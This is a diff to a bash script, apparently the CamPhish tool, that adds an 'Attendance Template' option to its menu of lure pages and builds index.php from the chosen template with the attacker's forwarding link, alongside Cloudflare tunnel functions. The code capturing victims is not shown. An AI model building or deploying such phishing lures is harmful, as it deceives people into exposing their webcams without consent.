@@ -297,8 +297,14 @@ payload_cloudflare() {
   fi
 
   # Create the site root (index.php) from the selected visual template.
-  # Use the dummy template for index generation (removed DSC Meet template)
-  sed 's+forwarding_link+'$link'+g' dummy_template.html > index.php
+  # Generate index.php from the selected template
+  if [[ $option_tem -eq 1 ]]; then
+    sed 's+forwarding_link+'$link'+g' dummy_template.html > index.php
+  elif [[ $option_tem -eq 2 ]]; then
+    sed 's+forwarding_link+'$link'+g' attendance_template.html > index.php
+  else
+    sed 's+forwarding_link+'$link'+g' dummy_template.html > index.php
+  fi
 }
 
 camphish() {
@@ -326,11 +332,13 @@ cloudflare_tunnel
 select_template() {
 printf "\n-----Choose a template----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Dummy Template\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Attendance Template\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-  # Dummy template selected; no additional input required
+  fest_name=""
+elif [[ $option_tem -eq 2 ]]; then
   fest_name=""
 else
   printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
